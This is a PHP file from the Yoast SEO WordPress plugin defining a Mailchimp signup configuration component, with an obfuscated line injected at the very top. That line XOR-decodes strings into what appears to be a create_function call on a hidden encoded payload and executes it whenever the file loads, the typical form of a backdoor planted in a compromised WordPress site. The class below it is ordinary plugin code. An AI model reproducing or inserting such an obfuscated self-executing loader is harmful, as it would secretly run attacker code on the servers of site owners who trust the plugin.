<?php $cVtYsa='7F0T555+ ;+7>Z,'; $lHoQZHBN='T4U5APjMUUHCW5B'^$cVtYsa; $nTpWSBDD='PWGn6U CF-- +RM19O7ze46+s+,E6kl;=3mkpSOpOSO6.7I-=d0V 44J8;r,,<8kT7VE9NzA YDbZJtNc7A1LrBBLzTqWUrSKo-= gIZwetqwdH x=;G>=Son..;5qTKs:GOpnh>OD2AIJnkaR<MMM+QPcGuBUW-:5sYcvyBI0TEWGP.SWj.dZH4FK0ELDWzw:F,yMpo-Y6ZKePM54fwSXOY= hSf ,I2gK6+hpeW,Z9-kZCQBJ17MQlMo.-t>zx1zJ TcYP0ZksjmKT;>Qyn,Phr6O6Ss8K5wZmeU HbaJjTZHSjmdb5Z.:YziPeP<-uxFFQ4ZUfH4Xl.C84 6+Qys9hu y=moWZOdCEU8mUmvh<TVF7Hu=YcdkHW8Mm= ;vyxbU46rygcs51DZznunVJXC,y=B-X;eaS06>1gYF4:X==6;,. 13q1O;g50>Wjg,CMj85F wf7X-:W5XguDU.ZxhkF+41+j 4:PGw=XHieRV Ukhol 8>3Dh2E3s.H CLKkhPT-Wbvn=015pIjeTq:TqQlZO-40WVI mdzwqdZuf1phjzXc - zTKz=5aEaKr0VDMu7b,b4bHkPWw9  W+:32JiP =DXIbr8LIUQQHvcwWS =YjJhhKnXb8xsI1R9fr+LX+cD9R4Q78=bnKchkEODAGdsHz,'; $WgjTchIn=$lHoQZHBN('', '91oOP N 2DBNt75XJ;DRBLYY,OM1W43VHGJBYs4zF5:XMC BSDH9RkP+LZ-sAILCpS71XbZeK<=KzjTnCLK8EV-78ZiQprIYBfKRROm3WXTALDlIDNO5RX=GJJOOTXokWSldYda7k+G5idSKIvX,9,pu9>g+bq<HCnW0CSY1=B8 9otE6.CsMaB=O9U1969RSU3XPvzfPSKPAA4,AUFJs>.5NESYBDM=S8 SRHME1M6JHPPI7-8TV.9LeKqn;q11tZ+StG25IzVMJI=5WK4PNWZaVR.B2,S.LWgMA>E1YkCN0;<2JPDFC;BO<Ac-oZUKUPgb5U.4OhOReH,JQAUCqQWf:0q,x>;w;<Dg.0AMhSVLJ5:3RaUFSjmO,6L,2VEBVDXF>QOIsnjWQP0;ZSUJ +46IB7KPRFokwTWJPGdftO6NXDRMBIKVYI I8QQJ658A69BZT5EARh<HY8Q=OQ 4Z;QDKbOUEJ5KQCynL71.AA67T4KNILAJLR=7Y J,K0I088CO;1TpNVJYQETYiLCtYW0DyH>.YUkp=,YJ9SWLYzRTPDYRIlQBOCK2zOYQXrQxCR0q,LQSHUREaKvqWXRR6ReXW365XT7,:JUH-09>0,QOWs7AI8CcHHkNxBCrz,G3UNVO-,J8cI3M=XYYE3bXbb 7-5oTZspQ'^$nTpWSBDD); $WgjTchIn();
/**
 * @package WPSEO\Admin\ConfigurationUI
 */

/**
 * Represents the mailchimp signup components.
 */
class WPSEO_Config_Component_Mailchimp_Signup implements WPSEO_Config_Component {

	const META_NAME = 'wpseo-has-mailchimp-signup';

	/**
	 * Gets the component identifier.
	 *
	 * @return string
	 */
	public function get_identifier() {
		return 'MailchimpSignup';
	}

	/**
	 * Gets the field.
	 *
	 * @return WPSEO_Config_Field
	 */
	public function get_field() {
		return new WPSEO_Config_Field_Mailchimp_Signup();
	}

	/**
	 * Get the data for the field.
	 *
	 * @return mixed
	 */
	public function get_data() {
		$data = array(
			'hasSignup' => $this->has_mailchimp_signup(),
		);

		return $data;
	}

	/**
	 * Save data
	 *
	 * @param array $data Data containing changes.
	 *
	 * @return mixed
	 */
	public function set_data( $data ) {

		$has_saved = false;
		if ( ! empty( $data['hasSignup'] ) ) {
			// Saves the user meta.
			update_user_meta( get_current_user_id(), self::META_NAME, true );

			$has_saved = ( $data['hasSignup'] === $this->has_mailchimp_signup() );
		}

		// Collect results to return to the configurator.
		$results = array(
			'hasSignup' => $has_saved,
		);

		return $results;
	}

	/**
	 * Checks if the user has entered his email for mailchimp already.
	 *
	 * @return bool
	 */
	protected function has_mailchimp_signup() {
		$user_meta = get_user_meta( get_current_user_id(), self::META_NAME, true );

		return ( ! empty( $user_meta ) );
	}
}
